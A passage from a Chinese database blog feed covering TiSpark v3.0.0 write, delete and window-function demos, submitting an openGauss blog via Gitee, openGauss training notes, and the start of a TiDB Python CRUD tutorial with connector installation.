<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">val df = spark.sql(&quot;select * from test.t2&quot;)</span><br><span class="line"></span><br><span class="line">df.write.</span><br><span class="line">  format(&quot;tidb&quot;).</span><br><span class="line">  option(&quot;tidb.user&quot;, &quot;root&quot;).</span><br><span class="line">  option(&quot;tidb.password&quot;, &quot;&quot;).</span><br><span class="line">  option(&quot;database&quot;, &quot;test&quot;).</span><br><span class="line">  option(&quot;table&quot;, &quot;t1&quot;).</span><br><span class="line">  mode(&quot;append&quot;).</span><br><span class="line">  save()</span><br></pre></td></tr></table></figure></div>
<p>append 意为将此数据插入到具有与 DataFrame 相同的模式的现有表中。</p>
<ol start="5">
<li>再次查看 t1 表数据，确认数据已成功写入。</li>
</ol>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">spark.sql(&quot;select * from test.t1&quot;).show()</span><br></pre></td></tr></table></figure></div>
<p>数据写入的关键日志如下图：</p>
<img  alt="4.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://tidb-blog.oss-cn-beijing.aliyuncs.com/media/5-1655090548324.png"
                      referrerpolicy="no-referrer"
                >
<ol start="6">
<li>也可从 TiDB 查询 t1 表数据，确认数据已写入。</li>
</ol>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">TiDB-v6 [test] 17:27:21&gt; select * from t1;</span><br><span class="line">+------+------+</span><br><span class="line">| id   | col  |</span><br><span class="line">+------+------+</span><br><span class="line">|    1 | a    |</span><br><span class="line">|    2 | b    |</span><br><span class="line">+------+------+</span><br><span class="line">2 rows in set (0.002 sec)</span><br></pre></td></tr></table></figure></div>
<h3 id="使用-spark-shell-进行数据删除">使用 spark-shell 进行数据删除</h3>
<p>这是 TiSpark v3.0.0 的新特性。接下来，演示如何使用 spark-shell 删除数据。</p>
<p>启动 spark-shell 后，查看 TiSpark 版本信息。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">scala&gt; spark.sql(&quot;select ti_version()&quot;).collect</span><br><span class="line">res1: Array[org.apache.spark.sql.Row] =</span><br><span class="line">Array([Release Version: 3.0.0</span><br><span class="line">Git Commit Hash: 4e48f9e5e87ee24fbdceb6aa5a9a3c5a7661e22e</span><br><span class="line">Git Branch: 3.0_release</span><br><span class="line">UTC Build Time: 2022-06-15 06:22:06</span><br><span class="line">Supported Spark Version: 3.0 3.1 3.2</span><br><span class="line">Current Spark Version: 3.0.3</span><br><span class="line">Current Spark Major Version: 3.0</span><br><span class="line">TimeZone: Asia/Shanghai])</span><br></pre></td></tr></table></figure></div>
<p>前3个步骤与上一小节的写入步骤一样，从第4步开始，调用删除方法。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">scala&gt; spark.sql(&quot;select count(*) from test.t1&quot;).show()</span><br><span class="line">+--------+</span><br><span class="line">|count(1)|</span><br><span class="line">+--------+</span><br><span class="line">|       1|</span><br><span class="line">+--------+</span><br><span class="line"></span><br><span class="line">scala&gt; spark.sql(&quot;delete from test.t1 where id=1&quot;)</span><br><span class="line">res5: org.apache.spark.sql.DataFrame = []</span><br><span class="line"></span><br><span class="line">scala&gt; spark.sql(&quot;select count(*) from test.t1&quot;).show()</span><br><span class="line">+--------+</span><br><span class="line">|count(1)|</span><br><span class="line">+--------+</span><br><span class="line">|       0|</span><br><span class="line">+--------+</span><br></pre></td></tr></table></figure></div>
<p>对于新支持的 <code>delete</code> 操作，有如下<strong>限制</strong>，使用时需注意。</p>
<ol>
<li><code>Delete</code> 语句必须含有 <code>where</code> 条件，但不能接 <code>where 1=1</code>。</li>
</ol>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">scala&gt; spark.sql(&quot;delete from test.t1 where 1=1&quot;)</span><br><span class="line">java.lang.IllegalArgumentException: requirement failed: Delete with alwaysTrue WHERE clause is not supported</span><br></pre></td></tr></table></figure></div>
<ol start="2">
<li>不支持子查询。</li>
</ol>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">scala&gt; spark.sql(&quot;delete from test.t2 where id in (select id from test.t1)&quot;)</span><br><span class="line">org.apache.spark.sql.AnalysisException: Delete by condition with subquery is not supported: Some(id#275L IN (list#274 []));</span><br></pre></td></tr></table></figure></div>
<ol start="3">
<li>不支持分区表，不支持悲观事务。</li>
</ol>
<h3 id="使用-PySpark-演示窗口函数">使用 PySpark 演示窗口函数</h3>
<p>本例已 <code>rank()</code> 函数为例，其他窗口函数类似。</p>
<ol>
<li>准备测试数据。</li>
</ol>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">DROP TABLE if EXISTS student;</span><br><span class="line">CREATE TABLE if NOT EXISTS student (course VARCHAR(10), mark INT, name VARCHAR(10));</span><br><span class="line">INSERT INTO student VALUES</span><br><span class="line">(&#x27;Maths&#x27;, 60, &#x27;Thulile&#x27;),</span><br><span class="line">(&#x27;Maths&#x27;, 60, &#x27;Pritha&#x27;),</span><br><span class="line">(&#x27;Maths&#x27;, 70, &#x27;Voitto&#x27;),</span><br><span class="line">(&#x27;Maths&#x27;, 55, &#x27;Chun&#x27;),</span><br><span class="line">(&#x27;Biology&#x27;, 60, &#x27;Bilal&#x27;),</span><br><span class="line">(&#x27;Biology&#x27;, 70, &#x27;Roger&#x27;);</span><br></pre></td></tr></table></figure></div>
<ol start="2">
<li>与 《使用 PySpark 进行数据读取》小节的前3步一致。</li>
<li>引用 pyspark 中的 <code>Window/functions</code> 方法，并进行查询。</li>
</ol>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pyspark.sql import Window, functions</span><br><span class="line"></span><br><span class="line">w = Window.partitionBy(&quot;course&quot;).orderBy(functions.desc(&quot;mark&quot;))</span><br><span class="line">df.select(&quot;course&quot;, &quot;mark&quot;, &quot;name&quot;, functions.rank().over(w).alias(&quot;rank&quot;)).show()</span><br></pre></td></tr></table></figure></div>
<ol start="4">
<li>查询结果输出如下。</li>
</ol>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">+-------+----+-------+----+</span><br><span class="line">| course|mark|   name|rank|</span><br><span class="line">+-------+----+-------+----+</span><br><span class="line">|  Maths|  70| Voitto|   1|</span><br><span class="line">|  Maths|  60|Thulile|   2|</span><br><span class="line">|  Maths|  60| Pritha|   2|</span><br><span class="line">|  Maths|  55|   Chun|   4|</span><br><span class="line">|Biology|  70|  Roger|   1|</span><br><span class="line">|Biology|  60|  Bilal|   2|</span><br><span class="line">+-------+----+-------+----+</span><br></pre></td></tr></table></figure></div>
<p>实际上，在这个案例中，是通过 pyspark 连接到 TiDB Server，将表 <code>student</code> 的全部数据读取出来，再在 Spark 中进行运算，最终得到所示结果集。</p>
<p>到此，四个案例已全部演示完毕。</p>
<h2 id="TiSpark-v3-0-0-其他新功能">TiSpark v3.0.0 其他新功能</h2>
<h3 id="TiSpark-v3-0-0-支持-Spark-3-2">TiSpark v3.0.0 支持 Spark 3.2</h3>
<blockquote>
<p>新特性 – 支持 Spark 3.2 <a class="link"   href="https://github.com/pingcap/tispark/pull/2287" >#2287 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
</blockquote>
<p>解读：Spark 3.2.1 于 1月26日发版，是近期发布的最新稳定版本。</p>
<h3 id="TiSpark-v3-0-0-支持遥测">TiSpark v3.0.0 支持遥测</h3>
<blockquote>
<p>新特性 – 支持遥测以收集相关信息 <a class="link"   href="https://github.com/pingcap/tispark/issues/2316" >#2316 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
</blockquote>
<p>解读：</p>
<ol>
<li>遥测功能默认开启，可通过参数 <code>spark.tispark.telemetry.enable</code> 进行控制。</li>
<li>遥测功能会收集操作系统信息和部分 TiSpark 配置信息，并将信息分享给 PingCAP。具体收集方法，可参考源码。</li>
</ol>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">core/src/main/scala/com/pingcap/tispark/utils/SystemInfoUtil.scala</span><br><span class="line">core/src/main/scala/com/pingcap/tispark/telemetry/TelemetryRule.scala</span><br></pre></td></tr></table></figure></div>
<ol start="3">
<li>如果想看完整的遥测收集内容，可将 TiSpark 日志级别调至 <code>INFO</code> 及以下，然后在 Spark 的日志文件中查看。</li>
</ol>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line"># tispark v3.0.0, print telemetry content</span><br><span class="line">log4j.logger.com.pingcap.tispark=WARN</span><br></pre></td></tr></table></figure></div>
<h2 id="总结">总结</h2>
<ol>
<li>TiSpark 已支持从 TiKV 和 TiFlash 读取数据，并通过自定义插件的形式增强了数据处理能力和计算下推能力。并且支持绕过 TiDB Server 直接写入数据到 TiKV，大大提升了数据批量写入的效率。</li>
<li>TiSpark 对 TiDB 6.0 的支持尚未得到完全测试 (<a class="link"   href="https://github.com/pingcap/tispark/pull/2238" >#2238 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>)，建议使用 TiSpark 3.0.0 + TiDB 5.4 的版本搭配。</li>
<li>最新版本的 TiSpark 未推送到 tiup mirror，需从源码库下载，或直接通过 Maven 库引用。</li>
<li>由于 PySpark 底层调用的是 py4j，实际仍会转化为 Java，所以对于大量的流式计算，建议直接使用 Scala 或者 Java 编写程序。</li>
<li>TiSpark v3.0.0 支持删除语句，TiSpark 读写能力得到进一步强化。</li>
<li>TiSpark 是 TiDB 周边生态中的一个重点项目，但毕竟使用场景有一定的局限性，所以在期待 TiSpark 功能增强的同时，应多予以一些耐心和信心。</li>
</ol>
<h1>参考链接</h1>
<ul>
<li><a class="link"   href="https://github.com/pingcap/tispark" >TiSpark 源码 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://docs.pingcap.com/zh/tidb/stable/tispark-overview" >TiSpark 用户指南 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://spark.apache.org/" >Spark 官网 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a href="https://shawnyan.cn/2022/tidb/tidb-6.1-mpp-window-functions/">TiDB 6.x 新特性解读 | TiDB 6.1 MPP 实现窗口函数框架</a></li>
</ul>
<hr>
<p><a class="link"   href="https://www.modb.pro/db/414883" >https://www.modb.pro/db/414883 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 	<br>
<a class="link"   href="https://tidb.net/blog/5e697bac?shareId=2d29b9cf" >https://tidb.net/blog/5e697bac?shareId=2d29b9cf <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>
<a class="link"   href="https://tidb.net/book/book-rush/best-practice/tispark-practice/tispark-guide" >https://tidb.net/book/book-rush/best-practice/tispark-practice/tispark-guide <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>TiDB</category>
        <category>TiDB 6.x</category>
      </categories>
      <tags>
        <tag>tidb</tag>
        <tag>tidb 6.x</tag>
        <tag>tispark</tag>
        <tag>spark</tag>
        <tag>pyspark</tag>
      </tags>
  </entry>
  <entry>
    <title>如何使用 Gitee 向 openGauss 社区提交博客</title>
    <url>/2022/opengauss/opengauss-blog-commit-to-gitee/</url>
    <content><![CDATA[<p>在这篇 <a class="link"   href="https://mp.weixin.qq.com/s/o-I2NV_perAvI7mOkUqmSg" >《如何向openGauss社区提交你的第一篇博客》 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 文章中，已经介绍了如何向 openGauss 社区提交一篇博客。<br>
文中提到，需要先签署 CLA 协议，fork代码，然后使用 git 下载代码，编辑后再上传，最后提交 PR，等待合并到 master。<br>
但这一过程稍微有点繁琐，对于开发基础薄弱的同学不太友好。<br>
本文将演示如何使用 gitee 快速提交PR。</p>
<p>准备步骤与前文一致，需要先注册 gitee 账号，并进行 fork。</p>
<img  alt="01.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20220518-cbf0e7e6-c790-4822-8ceb-50b8ce86b83b.png"
                      referrerpolicy="no-referrer"
                >
<img  alt="02.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20220518-9290f73f-666c-49ad-b243-7c5c3ccaed74.png"
                      referrerpolicy="no-referrer"
                >
<p>第二步，在fork的仓库里打开Web IDE。</p>
<img  alt="03.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20220518-fa17c5c6-34b2-4916-b046-2c0431414537.png"
                      referrerpolicy="no-referrer"
                >
<p>第三步，在 Web IDE 中，找到目录 <code>content --&gt; zh --&gt; post</code>，创建自己的文件夹。</p>
<img  alt="04.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20220518-14c5a803-e944-43f4-97cc-012ed6631a76.png"
                      referrerpolicy="no-referrer"
                >
<p>第四步，鼠标右击刚才新建的文件夹，点击创建文件，然后将已经准备好的 markdown 格式的文章，复制到右侧编辑框。<br>
这里提醒一下，文章复制到编辑框即保存，不需要额外的操作。</p>
<img  alt="05.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20220518-79bebdaf-297e-4507-bb35-a1290f4b866b.png"
                      referrerpolicy="no-referrer"
                >
<p>第五步，文章编辑完成后，点击提交，点击 “+” 确认保存，下面写简短的提交信息，这里写的是“add my blog”，点击“提交到新分支”，IDE 会自动创建一个分支名，最后点击“提交”即可。</p>
<img  alt="06.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20220518-e17f8e9b-593b-42ce-8b00-9be8a2199be4.png"
                      referrerpolicy="no-referrer"
                >
<p>第六步，回到刚才fork后的页面，选择刚才新建的分支 <code>shawnyan-master-patch-33299</code>，并在文件夹 <code>blog/content/zh/post/ShawnYan</code> 下新建文件夹 <code>title</code>，用于存放头图。</p>
<img  alt="07.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20220518-dddcc227-d1ea-4116-8d04-117e526f2db5.png"
                      referrerpolicy="no-referrer"
                >
<p>第七步，在 <code>title</code> 文件夹下，点击“上传文件”，将准备好的头图上传。<br>
到此，博客编辑工作完成，下一步提交 PR。</p>
<img  alt="08.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20220518-bc3cca31-ee63-471d-9e46-daaf5d0ec196.png"
                      referrerpolicy="no-referrer"
                >
<p>第八步，提交PR。点击 “+ Pull Request” 按钮。在跳转后的页面，只需要填写 PR 名即可，如本例中填写 <code>add my blog</code>，其他使用默认值。</p>
<img  alt="09.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20220518-e3d25aa6-2091-40ec-973a-5d08abc0b8be.png"
                      referrerpolicy="no-referrer"
                >
<img  alt="10.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20220518-2d64d3b6-93d6-4bb9-af40-99a3d4c79a2f.png"
                      referrerpolicy="no-referrer"
                >
<p>至此，一篇博客就已经提交 PR了，接下来耐心等待社区的 Reviewer 进行合并，待合并完成且博客站点发版后，即可在<a class="link"   href="https://opengauss.org/zh/blogs/blogs.html" >这里 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>看到自己提交的文章了。</p>
<p>Shawn Yan<br>
2022-05-18</p>
<hr>
<p><a class="link"   href="https://www.modb.pro/db/405248" >https://www.modb.pro/db/405248 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>
<a class="link"   href="https://opengauss.org/zh/blogs/ShawnYan/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8Gitee%E5%90%91openGauss%E7%A4%BE%E5%8C%BA%E6%8F%90%E4%BA%A4%E5%8D%9A%E5%AE%A2.html" >openGauss 博客 – 如何使用Gitee向openGauss社区提交博客 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>openGauss</category>
      </categories>
      <tags>
        <tag>opengauss</tag>
        <tag>华为</tag>
        <tag>opengauss训练营</tag>
        <tag>blog</tag>
        <tag>gitee</tag>
      </tags>
  </entry>
  <entry>
    <title>openGauss 训练营学习心得</title>
    <url>/2022/opengauss/opengauss-8h-training-camp/</url>
    <content><![CDATA[<p>周末两天时间参加了《8小时玩转openGauss训练营》活动，跟随诸位 openGauss 专家们系统的学习了openGauss 数据库，对这个“榜一大哥”有了初步的认知。</p>
<p>整个活动持续2天下午，由11位分别来自华为、openGauss社区、云和恩墨的专家在线上做了8小时的分享。</p>
<h2 id="openGauss">openGauss</h2>
<p>openGauss 是一款全面友好开放，携手伙伴共同打造的企业级开源关系型数据库。openGauss 采用木兰宽松许可证v2发行，提供面向多核架构的极致性能、全链路的业务、数据安全、基于AI的调优和高效运维的能力。openGauss 内核源自 PostgreSQL，深度融合华为在数据库领域多年的研发经验，结合企业级场景需求，持续构建竞争力特性。同时，openGauss 也是一个开源、免费的数据库平台，鼓励社区贡献、合作。</p>
<h2 id="openGauss-核心技术">openGauss 核心技术</h2>
<p>1、在CPUNUMA多核的硬件发展趋势下，openGauss通过线程绑核，NUMA化数据结构改造，数据分区和原子指令优化实现150Wtpmc。<br>
2、企业可用性指标为RPO和RTO，openGauss支持双机同步保证RPO=0，通过极致RTO技术保证RTO&lt;10s。<br>
3、企业的性能指标为吞吐量和时延，openGauss通过服务器线程池支持企业的高并发，通过增量检查点保证IO性能的稳定性。<br>
4、企业的业务场景为OLTP和OLAP，openGauss通过行列混合引擎同时支持行存和列存，适应企业混合场景。<br>
5、在风控，计费等极端性能企业场景下，openGauss通过免锁内存表，内存索引算法保证高吞吐，低时延，满足企业场景要求。<br>
6、在云化的发展趋势下，openGauss通过全密态实现端到端加密，解决企业上云安全顾虑。<br>
7、通过DB4AI和AI4DB，实现openGauss自运维和调优，减少企业应用开发和维护的TCO。</p>
<h2 id="openGauss-vs-PostgreSQL">openGauss vs PostgreSQL</h2>
<p>openGauss数据库内核基于postgresql 9.2.4演进而来，但是华为公司对PG的内核做了非常大的改造和增强。</p>
<p>比如，openGauss把事务ID(XID)从32bit改成了64bit，64bit的xid的好处是永远不可能耗尽，好处是我们永远不用担心会发生xid回卷宕机的风险。注意，虽然xid改为了64bit，但是过期的事务ID依旧需要清理。实际上PostgreSQL数据库默认达到2亿事务就强制整理，而32bit的xid可以达到20亿，所以我们实际上可以修改autovacuum_freeze_max_age为10亿来推迟对xid的整理。</p>
<img  alt="20220517_215029.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20220517-cefa0cab-8c09-454e-ba23-34419d98e8da.png"
                      referrerpolicy="no-referrer"
                >
<h2 id="后记">后记</h2>
<p>纸上得来终觉浅。可以在墨天轮的实训环境快速体验openGauss，开箱即用。链接：<a class="link"   href="https://www.modb.pro/market/152515" >openGauss在线实训环境 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>openGauss训练营即将圆满收官，期待OpenGauss社区接下来更多精彩的课程。</p>
<p>ShawnYan<br>
2022-05-17</p>
<hr>
<p><a class="link"   href="https://www.modb.pro/db/404782" >https://www.modb.pro/db/404782 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>openGauss</category>
      </categories>
      <tags>
        <tag>opengauss</tag>
        <tag>postgresql</tag>
        <tag>华为</tag>
        <tag>opengauss训练营</tag>
      </tags>
  </entry>
  <entry>
    <title>TiDB 6.0 Book Rush | TiDB 和 Python 的 CRUD 应用开发实践</title>
    <url>/2022/tidb/tidb-6.0-sample-application-python/</url>
    <content><![CDATA[<p>本文将介绍如何使用 Python 对 TiDB 进行应用开发，并做简单的 CRUD 演示。<br>
对应 <a class="link"   href="https://asktug.com/t/topic/663914" >TiDB 6.0 Book Rush <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 的<a class="link"   href="https://tidb.net/book/book-rush/developer-guide/" >第二章 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 。</p>
<img  alt="IMG_2005.JPG" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://tidb-blog.oss-cn-beijing.aliyuncs.com/media/IMG_2005-1652257515326.jpg"
                      referrerpolicy="no-referrer"
                >
<h2 id="测试环境">测试环境</h2>
<p>为了便于演示应用开发，本文将使用 TiDB 6.0 本地测试集群，以及 MariaDB Connector/Python，具体环境版本信息如下。</p>
<blockquote>
<p>TiDB 6.0<br>
Python 3.6.8<br>
MariaDB Connector/Python 1.0.11</p>
</blockquote>
<h2 id="部署本地测试集群">部署本地测试集群</h2>
<p>快速启动本地测试集群，具体方法请参考 <a class="link"   href="https://docs.pingcap.com/zh/tidb/stable/quick-start-with-tidb#Linux" >官方文档–部署本地测试集群 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 和文章 <a href="https://shawnyan.cn/2022/tidb/tiup-intro/">《TiUP：TiDBAer 必备利器》</a> 。</p>
<ul>
<li>本文使用的测试环境启动命令为：</li>
</ul>
<div class="highlight-container" data-rel="Yaml"><figure class="iseeu highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">tiup</span> <span class="string">playground</span> <span class="string">v6.0.0</span> <span class="string">--host</span> <span class="number">192.168</span><span class="number">.8</span><span class="number">.101</span> <span class="string">--tag</span> <span class="string">classroom</span> <span class="string">--pd</span> <span class="number">3</span> <span class="string">--kv</span> <span class="number">2</span> <span class="string">--db</span> <span class="number">1</span> <span class="string">--tiflash</span> <span class="number">1</span></span><br></pre></td></tr></table></figure></div>
<ul>
<li>运行结果为：</li>
</ul>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">CLUSTER START SUCCESSFULLY, Enjoy it ^-^</span><br><span class="line">To connect TiDB: mysql --comments --host 192.168.8.101 --port 4000 -u root -p (no password)</span><br><span class="line">To view the dashboard: http://192.168.8.101:2379/dashboard</span><br><span class="line">PD client endpoints: [192.168.8.101:2379 192.168.8.101:2382 192.168.8.101:2384]</span><br></pre></td></tr></table></figure></div>
<h2 id="Python-连接器">Python 连接器</h2>
<h3 id="介绍几种常见的-Python-连接器">介绍几种常见的 Python 连接器</h3>
<p>TiDB 高度兼容 MySQL 5.7 协议，理论上只要是支持 MySQL 及其分支版本的 Python 连接器都可以连接 TiDB，但仍需要具体测试。</p>
<ul>
<li>
<p>MySQL 官方提供的连接器为 <a class="link"   href="https://dev.mysql.com/doc/relnotes/connector-python/en/" >MySQL Connector/Python <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 。最新GA版本 8.0.29，官方文档推荐升级到最新版本，并声明此版本可用于 MySQL Server 8.0 和 5.7。</p>
</li>
<li>
<p>MariaDB 提供的连接器为 <a class="link"   href="https://mariadb.com/kb/en/mariadb-connector-python/" >MariaDB Connector/Python <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 。最新GA版本为 1.0.11，可用于访问 MariaDB 和 MySQL，使用的 API 与 <a class="link"   href="https://peps.python.org/pep-0249/" >Python DB API Spec 2.0 (PEP 249) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 兼容。</p>
</li>
</ul>
<p>除这两种官方连接器之外，还有两种常见的客户端，分别是：</p>
<ul>
<li>
<p>Python 2 下使用的 <a class="link"   href="https://pypi.org/project/MySQL-python/" >MySQL-python <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> ，该包已停止维护，不推荐使用。</p>
</li>
<li>
<p>Python 3 下使用的 <a class="link"   href="https://pypi.org/project/PyMySQL/" >pyMySQL <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> ，该包持续更新，且遵从 <a class="link"   href="https://en.wikipedia.org/wiki/MIT_License" >MIT 协议 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> ，可放心使用。</p>
</li>
</ul>
<p>本文使用的是 MariaDB Connector/Python，下面将做具体演示。</p>
<h3 id="安装-Python-连接器">安装 Python 连接器</h3>
<h4 id="CentOS-7-环境">CentOS 7 环境</h4>
<p>由于 MariaDB Connector/Python 使用 Python 3 编写，且依赖 MariaDB Connector/C，所以需要先安装依赖包。</p>
<ul>
<li>安装必要的依赖：</li>
</ul>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">sudo yum install -y MariaDB-devel gcc python3-devel</span><br></pre></td></tr></table></figure></div>
<ul>
<li>安装完成后，检查已安装的包：</li>
</ul>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">shawnyan@centos7:~$ rpm -q MariaDB-devel gcc python3-devel</span><br><span class="line">MariaDB-devel-10.6.7-1.el7.centos.x86_64</span><br><span class="line">gcc-4.8.5-44.el7.x86_64</span><br><span class="line">python3-devel-3.6.8-18.el7.x86_64</span><br></pre></td></tr></table></figure></div>
<ul>
<li>通过 pip 安装连接器：</li>
</ul>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">python3 -m pip install mariadb --user</span><br></pre></td></tr></table></figure></div>
<ul>
<li>运行结果为：</li>
</ul>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">shawnyan@centos7:~$ python3 -m pip install mariadb --user</span><br><span class="line">Installing collected packages: mariadb</span><br><span class="line">    Running setup.py install for mariadb ... done</span><br><span class="line">Successfully installed mariadb-1.0.11</span><br></pre></td></tr></table></figure></div>
<ul>
<li>安装步骤支持幂等性，二次执行命令结果如下：</li>
</ul>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">shawnyan@centos7:~$ python3 -m pip install mariadb --user</span><br><span class="line">Requirement already satisfied: mariadb in /home/shawnyan/.local/lib/python3.6/site-packages (1.0.11)</span><br></pre></td></tr></table></figure></div>
<ul>
<li>安装完成后，检查已安装的包：</li>
</ul>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">shawnyan@centos7:~$ python3 -m pip show mariadb</span><br><span class="line">Name: mariadb</span><br><span class="line">Version: 1.0.11</span><br><span class="line">Summary: Python MariaDB extension</span><br><span class="line">Home-page: https://www.github.com/mariadb-corporation/mariadb-connector-python</span><br><span class="line">Author: Georg Richter</span><br><span class="line">Author-email:</span><br><span class="line">License: LGPL 2.1</span><br><span class="line">Location: /home/shawnyan/.local/lib/python3.6/site-packages</span><br><span class="line">Requires:</span><br><span class="line">Required-by:</span><br></pre></td></tr></table></figure></div>
<p>到此，安装完成！</p>
<h4 id="Windows-环境">Windows 环境</h4>
<p>与 CentOS 环境类似，需要安装 MariaDB Connector/C，下载页面为 <a class="link"   href="https://mariadb.com/downloads/connectors/" >Connectors <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>。</p>
<p>此外，还需要安装 Microsoft Visual C++ 14.0，下载页面为 <a class="link"   href="https://visualstudio.microsoft.com/downloads/" >Microsoft Visual C++ Build Tools <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>。</p>
<p>本文示例代码是在 PyCharm 中开发的，所以在安装完成依赖后，直接在 PyCharm 中安装 MariaDB Connector/Python。</p>
<p>安装路径为：<code>File &gt; Settings &gt; Project &gt; Available Packages</code>。</p>
<img  alt="1.jpg" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20220513-396fa102-15a2-4d0a-84f6-da12f6c5a81b.jpg"
                      referrerpolicy="no-referrer"
                >
<p>图-安装mariadb包</p>
<p>到此，安装完成！</p>
<h2 id="CURD-实践">CURD 实践</h2>
<h3 id="基础数据">基础数据</h3>
<p>通过 <code>tiup demo</code> 创建基础数据，会自动在 TiDB 中创建库 <a href="https://docs.pingcap.com/zh/tidb/dev/bookshop-schema-design"><code>bookshop</code></a> 以及 6 张表，并导入基础数据。</p>
<blockquote>
<p>Bookshop 是一个虚拟的在线书店应用，你可以在 Bookshop 当中便捷地购买到各种类别的书，也可以对你看过的书进行点评。</p>
</blockquote>
<ul>
<li>执行如下命令，生成基础数据：</li>
</ul>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">tiup demo bookshop prepare -H 192.168.8.101</span><br></pre></td></tr></table></figure></div>
<ul>
<li>运行结果为：</li>
</ul>
